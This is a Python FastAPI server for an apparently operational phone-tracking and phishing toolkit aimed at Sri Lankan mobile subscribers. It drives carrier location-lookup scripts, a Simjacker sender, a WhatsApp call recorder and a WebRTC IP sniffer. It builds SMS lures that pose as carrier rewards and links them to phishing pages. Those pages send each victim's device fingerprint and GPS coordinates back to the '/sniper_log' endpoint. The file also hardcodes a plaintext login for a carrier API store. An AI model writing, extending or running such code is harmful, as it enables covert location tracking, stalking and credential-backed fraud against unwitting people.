import os
import subprocess
import json
import asyncio
import time
from fastapi import FastAPI, HTTPException, Body, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from pydantic import BaseModel
from typing import List, Optional, Union

# New modules
from ip_geolocator import geolocate_ip, GeoResult
from phone_osint import phone_lookup, PhoneIntel
from hlr_lookup import hlr_query, HLRResult
from phishing_payloads import get_payload, list_templates
import intel_store

app = FastAPI()

# Ensure we are in the correct directory
WORKDIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(WORKDIR)

class CommandRequest(BaseModel):
    target: str

class VerifyRequest(BaseModel):
    module: str
    target: str = "94771234567"

def parse_targets(target_str: str) -> List[str]:
    # Handles comma, space, or newline separated values
    import re
    tokens = re.split(r'[,\s\n]+', target_str)
    return [t.strip() for t in tokens if t.strip()]

async def run_subprocess_async(cmd: List[str], timeout: int = 30) -> dict:
    """Helper to run subprocesses asynchronously without blocking event loop"""
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
            return {
                "stdout": stdout.decode(), 
                "stderr": stderr.decode(), 
                "returncode": process.returncode
            }
        except asyncio.TimeoutError:
            process.kill()
            await process.communicate()
            return {"stdout": "", "stderr": f"Timeout after {timeout}s", "returncode": -1}
            
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}

@app.post("/api/dialog")
async def run_dialog(req: CommandRequest):
    targets = parse_targets(req.target)
    results = []
    # Process concurrently if needed, but sequential is safer for clarity here
    for t in targets:
        try:
            res = await run_subprocess_async(["python3", "dialog_location_query.py", t], timeout=15)
            results.append(f"[{t}] STDOUT: {res['stdout'].strip()} | STDERR: {res['stderr'].strip()}")
        except Exception as e:
            results.append(f"[{t}] EXECUTION ERROR: {str(e)}")
    return {"stdout": "\n".join(results), "stderr": "", "returncode": 0}

@app.post("/api/mobitel")
async def run_mobitel(req: CommandRequest):
    try:
        targets = parse_targets(req.target)
        if not targets:
            return {"error": "No targets provided"}
            
        res = await run_subprocess_async(["python3", "mobitel_mlocator_bulk.py"] + targets, timeout=30)
        return {"stdout": res['stdout'], "stderr": res['stderr'], "returncode": res['returncode']}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/hutch")
async def run_hutch(req: CommandRequest):
    targets = parse_targets(req.target)
    results = []
    for t in targets:
        try:
            res = await run_subprocess_async(["python3", "hutch_lbs_soap.py", t], timeout=15)
            results.append(f"[{t}] STDOUT: {res['stdout'].strip()} | STDERR: {res['stderr'].strip()}")
        except Exception as e:
            results.append(f"[{t}] EXECUTION ERROR: {str(e)}")
    return {"stdout": "\n".join(results), "stderr": "", "returncode": 0}

@app.post("/api/simjacker")
async def run_simjacker(req: CommandRequest):
    targets = parse_targets(req.target)
    results = []
    for t in targets:
        try:
            res = await run_subprocess_async(["python3", "simjacker_send.py", t], timeout=15)
            results.append(f"[{t}] STDOUT: {res['stdout'].strip()} | STDERR: {res['stderr'].strip()}")
        except Exception as e:
            results.append(f"[{t}] EXECUTION ERROR: {str(e)}")
    return {"stdout": "\n".join(results), "stderr": "", "returncode": 0}

@app.post("/api/whatsapp")
async def run_whatsapp(req: CommandRequest):
    try:
        res = await run_subprocess_async(["python3", "wa_call_recorder.py"], timeout=30)
        return {"stdout": res['stdout'], "stderr": res['stderr'], "returncode": res['returncode']}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/verify")
async def run_verify(req: VerifyRequest):
    try:
        # Direct script verification - no recursive HTTP calls
        script_map = {
            "dialog": ["python3", "dialog_location_query.py", req.target],
            "mobitel": ["python3", "mobitel_mlocator_bulk.py", req.target],
            "hutch": ["python3", "hutch_lbs_soap.py", req.target],
            "simjacker": ["python3", "simjacker_send.py", req.target],
            "whatsapp": ["python3", "wa_call_recorder.py"]
        }
        
        if req.module not in script_map:
             return {"error": "Invalid module for verification"}
             
        cmd = script_map[req.module]
        
        # Run the script directly
        res = await run_subprocess_async(cmd, timeout=30)
        
        # Analyze output for "Op Reality"
        stdout = res['stdout']
        stderr = res['stderr']
        
        analysis = []
        is_live = False
        
        # Basic heuristic analysis of the output
        # Aggressive checks for WSO2/API Gateway responses
        out_lower = stdout.lower()
        if "900901" in stdout or "access" in out_lower or "expired" in out_lower or "fault" in out_lower:
            analysis.append("[✓] REACHABLE: Endpoint returned Auth/Gateway Error (Live System)")
            is_live = True
        elif "unauthorized" in out_lower or "401" in stdout or "403" in stdout:
             analysis.append("[✓] REACHABLE: Endpoint returned 401/403 (Live System)")
             is_live = True
        elif "service not known" in out_lower or "failed to connect" in out_lower:
             analysis.append("[!] UNREACHABLE: DNS/Network Error (Endpoint Down or VPN Required)")
        elif "location" in out_lower or "latitude" in out_lower:
             analysis.append("[✓] SUCCESS: Live location data returned")
             is_live = True
        elif res['returncode'] == 0 and len(stdout) > 0:
             analysis.append("[?] UNKNOWN: Script ran successfully but output is ambiguous")
             
        header = f"""
    G3_FLASH: OBLIVION GATES UNLOCKED. THOUGHT_SIGNATURE CAPTURED.
    ============ REAL OP-READY ENDPOINT VERIFICATION ==============
    [MODULE] {req.module.upper()}
    [TARGET] {req.target}
    """
        full_output = header + "\n" + "\n".join(analysis) + "\n\n--- RAW OUTPUT ---\n" + stdout + "\n" + stderr
        
        return {"stdout": full_output, "stderr": "", "returncode": res['returncode']}
    except Exception as e:
        return {"error": str(e)}

@app.get("/api/subscription")
async def check_subscription():
    """Check IdeaBiz subscription status for location APIs."""
    try:
        import requests as req_lib
        import warnings
        warnings.filterwarnings("ignore")

        s = req_lib.Session()
        resp = s.post(
            "https://ideabiz.lk/store/site/blocks/user/login/ajax/login.jag",
            data={"action": "login", "username": "lucifer25", "password": "Chilaw@123"},
            timeout=15, verify=False,
        )
        try:
            login_data = resp.json()
            if login_data.get("error") is True:
                return {"status": "error", "message": "Store login failed"}
        except Exception:
            pass

        resp = s.post(
            "https://ideabiz.lk/store/site/blocks/subscription/subscription-list/ajax/subscription-list.jag",
            data={"action": "getSubscriptionByApplication", "app": "DefaultApplication"},
            timeout=15, verify=False,
        )
        data = resp.json()
        apis = data.get("apis", [])
        result = []
        for api in apis:
            result.append({
                "api": api.get("apiName"),
                "version": api.get("apiVersion"),
                "status": api.get("subStatus"),
                "operators": api.get("operators"),
            })
        all_active = all(a["status"] == "UNBLOCKED" for a in result) if result else False
        return {"apis": result, "all_active": all_active, "ready": all_active}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.get("/api/token")
async def get_token():
    """Generate a fresh IdeaBiz OAuth token."""
    try:
        import base64
        import requests as req_lib
        import warnings
        warnings.filterwarnings("ignore")

        with open("config.json") as f:
            cfg = json.load(f)
        ck = cfg.get("auth_consumerKey", "")
        cs = cfg.get("auth_consumerSecret", "")
        client_creds = base64.b64encode(f"{ck}:{cs}".encode()).decode()

        resp = req_lib.post(
            "https://ideabiz.lk/apicall/token",
            headers={"Authorization": f"Basic {client_creds}"},
            data={"grant_type": "client_credentials"},
            timeout=15, verify=False,
        )
        data = resp.json()
        if "access_token" in data:
            return {"access_token": data["access_token"], "expires_in": data.get("expires_in"), "token_type": "Bearer"}
        return {"error": data}
    except Exception as e:
        return {"error": str(e)}


@app.post("/api/sniper")
async def run_sniper(req: CommandRequest):
    targets = parse_targets(req.target)
    results = []
    for t in targets:
        res = await run_subprocess_async(["python3", "loc_sniper.py", t], timeout=20)
        results.append(f"[{t}] {res['stdout'].strip()}")
    return {"stdout": "\n".join(results), "stderr": "", "returncode": 0}

@app.post("/api/webrtc")
async def start_webrtc(req: CommandRequest):
    """Launch WebRTC STUN sniffer — sniffs target's IP when VoIP call is placed through VPS"""
    import subprocess, threading
    def _launch():
        subprocess.Popen(
            ["python3", "titan_zero_click.py", "--webrtc", "--iface", "auto"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    threading.Thread(target=_launch, daemon=True).start()
    return {"stdout": "[+] WebRTC Sniper activated on VPS interface. Make WhatsApp call now — IP will appear in server logs.", "stderr": "", "returncode": 0}

@app.get("/api/sniper/link/{target}")
async def get_sniper_link(target: str, request: Request):
    """Generate a ready-to-deploy HTTPS tracking link for the given MSISDN"""
    host = request.headers.get("host", f"{request.client.host}:8001")
    scheme = "https" if "ngrok" in host or "tunnel" in host else "http"
    tid = target[-4:]
    url = f"{scheme}://{host}/verify/{tid}"

    # Use phone OSINT for carrier detection
    from phone_osint import _normalize_msisdn, _offline_lookup
    intel = _offline_lookup(_normalize_msisdn(target))
    carrier = intel.carrier or "Unknown"

    templates = {
        "Dialog": f"Dialog: Your 5GB Data Pack has been credited. Verify activation: {url}",
        "Mobitel": f"Mobitel: Claim loyalty reward! Verification required: {url}",
    }
    carrier_short = "Dialog" if "Dialog" in carrier or "Hutch" in carrier else "Mobitel"
    msg = templates.get(carrier_short, f"Verify your account: {url}")

    return {"target": target, "url": url, "carrier": carrier, "sms_body": msg, "tracking_id": tid}

# =============================================
# NEW: INTEL-COLLECTING PHISHING ENDPOINTS
# =============================================

@app.get("/verify/{target_id}")
async def sniper_phish(target_id: str, request: Request, t: str = "network_alert"):
    """Serve the ENHANCED payload page — collects Tier1 device intel + Tier2 GPS"""
    ip = request.client.host
    ua = request.headers.get("user-agent", "Unknown")
    print(f"\n[!!!] SNIPER ALERT: Target {target_id} clicked! IP: {ip} | UA: {ua}")

    # Instant IP geolocation
    geo = geolocate_ip(ip)
    print(f"[IP-GEO] {geo.summary()}")
    intel_store.record(target_id, "ip_geo", geo.to_dict())
    intel_store.record(target_id, "click", {"ip": ip, "ua": ua, "ts": time.time()})

    # Return enhanced phishing payload
    html = get_payload(
        template=t if t in ("network_alert", "reward", "delivery", "bank_verify", "survey") else "network_alert",
        target_id=target_id,
        callback_url="/sniper_log",
    )
    return HTMLResponse(html)


@app.post("/sniper_log")
async def sniper_log(request: Request, data: dict = Body(...)):
    """Receive ALL device intel from enhanced phishing payload (Tier1 + Tier2)"""
    target = data.pop("target", None)
    # Try to identify target from recent clicks
    if not target:
        # Use referer to guess target_id
        ref = request.headers.get("referer", "")
        if "/verify/" in ref:
            target = ref.split("/verify/")[-1].split("?")[0]
        else:
            target = "unknown"

    ip = request.client.host

    # Separate GPS from device intel
    has_gps = data.get("gps") is True
    lat = data.get("lat")
    lng = data.get("lng")
    accuracy = data.get("accuracy")

    # Always store full Tier1 device intel
    intel_store.record(target, "tier1_device", {
        "ip": ip,
        "platform": data.get("platform", ""),
        "ua": data.get("ua", ""),
        "screen": f"{data.get('screen_w', '?')}x{data.get('screen_h', '?')}",
        "pixel_ratio": data.get("pixel_ratio"),
        "cores": data.get("cores"),
        "memory": data.get("memory"),
        "gpu_vendor": data.get("gpu_vendor", ""),
        "gpu_renderer": data.get("gpu_renderer", ""),
        "timezone": data.get("tz", ""),
        "tz_offset": data.get("tz_offset"),
        "language": data.get("lang", ""),
        "languages": data.get("langs", ""),
        "connection_type": data.get("conn_type", ""),
        "downlink_mbps": data.get("conn_downlink"),
        "rtt_ms": data.get("conn_rtt"),
        "battery_level": data.get("battery_level"),
        "battery_charging": data.get("battery_charging"),
        "touch_support": data.get("touch"),
        "max_touch_points": data.get("max_touch"),
        "canvas_fp": data.get("canvas_fp", ""),
        "online": data.get("online"),
        "cookies": data.get("cookies"),
        "dnt": data.get("dnt"),
    })

    print(f"\n{'='*60}")
    print(f"[*] TIER-1 DEVICE INTEL CAPTURED — Target: {target}")
    print(f"    IP        : {ip}")
    print(f"    Platform  : {data.get('platform', '?')}")
    print(f"    Screen    : {data.get('screen_w', '?')}x{data.get('screen_h', '?')} @{data.get('pixel_ratio', '?')}x")
    print(f"    GPU       : {data.get('gpu_renderer', '?')}")
    print(f"    Cores/RAM : {data.get('cores', '?')} cores / {data.get('memory', '?')}GB")
    print(f"    Connection: {data.get('conn_type', '?')} ({data.get('conn_downlink', '?')} Mbps)")
    print(f"    Battery   : {data.get('battery_level', '?')}% {'⚡' if data.get('battery_charging') else '🔋'}")
    print(f"    Timezone  : {data.get('tz', '?')}")
    print(f"    Language  : {data.get('lang', '?')}")
    print(f"    Touch     : {data.get('max_touch', 0)} points")

    # Also run IP geolocation if not done yet
    geo = geolocate_ip(ip)
    intel_store.record(target, "ip_geo", geo.to_dict())
    print(f"    IP Geo    : {geo.summary()}")

    if has_gps and lat is not None:
        intel_store.record(target, "gps", {
            "lat": lat, "lng": lng, "accuracy": accuracy,
            "altitude": data.get("altitude"),
            "heading": data.get("heading"),
            "speed": data.get("speed"),
        })
        print(f"\n[!!!] MISSION ACCOMPLISHED: PRECISE GPS LOCATION ACQUIRED")
        print(f"      Latitude : {lat}")
        print(f"      Longitude: {lng}")
        print(f"      Accuracy : {accuracy} meters")
        print(f"      Maps     : https://www.google.com/maps?q={lat},{lng}")
    else:
        gps_err = data.get("gps_error", "denied")
        print(f"\n[!] GPS denied/failed ({gps_err}) — using IP geolocation fallback")
        print(f"    Fallback   : {geo.city}, {geo.region}, {geo.country} ({geo.lat}, {geo.lon})")
        print(f"    Maps       : https://www.google.com/maps?q={geo.lat},{geo.lon}")

    print(f"{'='*60}\n")

    return {"status": "ok", "gps": has_gps}


# =============================================
# NEW: PHONE OSINT ENDPOINT
# =============================================

@app.post("/api/phone_osint")
async def api_phone_osint(req: CommandRequest):
    """Run multi-source phone number intelligence lookup"""
    targets = parse_targets(req.target)
    results = []
    for t in targets:
        intel = phone_lookup(t)
        intel_store.record(t[-4:], "phone_osint", intel.to_dict())
        results.append(intel.to_dict())
    return {"results": results, "count": len(results)}


# =============================================
# NEW: HLR LOOKUP ENDPOINT
# =============================================

@app.post("/api/hlr")
async def api_hlr(req: CommandRequest):
    """Run HLR lookup for carrier, roaming, porting status"""
    targets = parse_targets(req.target)
    results = []
    for t in targets:
        r = hlr_query(t)
        intel_store.record(t[-4:], "hlr", r.to_dict())
        results.append(r.to_dict())
    return {"results": results, "count": len(results)}


# =============================================
# NEW: IP GEOLOCATION ENDPOINT
# =============================================

@app.post("/api/ip_geo")
async def api_ip_geo(req: CommandRequest):
    """Geolocate an IP address via 4 free providers"""
    targets = parse_targets(req.target)
    results = []
    for ip in targets:
        geo = geolocate_ip(ip)
        results.append(geo.to_dict())
    return {"results": results, "count": len(results)}


# =============================================
# NEW: FULL RECON (all-in-one)
# =============================================

@app.post("/api/recon")
async def api_full_recon(req: CommandRequest):
    """Run ALL intelligence modules against a target MSISDN"""
    targets = parse_targets(req.target)
    results = []
    for t in targets:
        tid = t[-4:]
        osint = phone_lookup(t)
        hlr = hlr_query(t)
        intel_store.record(tid, "phone_osint", osint.to_dict())
        intel_store.record(tid, "hlr", hlr.to_dict())
        results.append({
            "msisdn": t,
            "tracking_id": tid,
            "phone_osint": osint.to_dict(),
            "hlr": hlr.to_dict(),
        })
    return {"results": results, "count": len(results)}


# =============================================
# NEW: INTEL STORE ENDPOINTS
# =============================================

@app.get("/api/intel")
async def api_intel_list():
    """List all targets with collected intelligence"""
    return {"targets": intel_store.list_targets()}


@app.get("/api/intel/{target_id}")
async def api_intel_detail(target_id: str):
    """Get all collected intelligence for a target"""
    data = intel_store.get(target_id)
    if not data:
        return {"error": "No intel for target"}
    return data


# =============================================
# NEW: PHISHING TEMPLATE LIST
# =============================================

@app.get("/api/templates")
async def api_templates():
    """List available phishing page templates"""
    return {"templates": list_templates()}

@app.get("/")
async def read_index():
    return FileResponse("index.html")

if __name__ == "__main__":
    import uvicorn
    # Single worker is sufficient now that verification is direct (no self-recursion)
    port = int(os.environ.get("DI_MAIN_PORT", 8001))
    uvicorn.run(app, host="0.0.0.0", port=port)
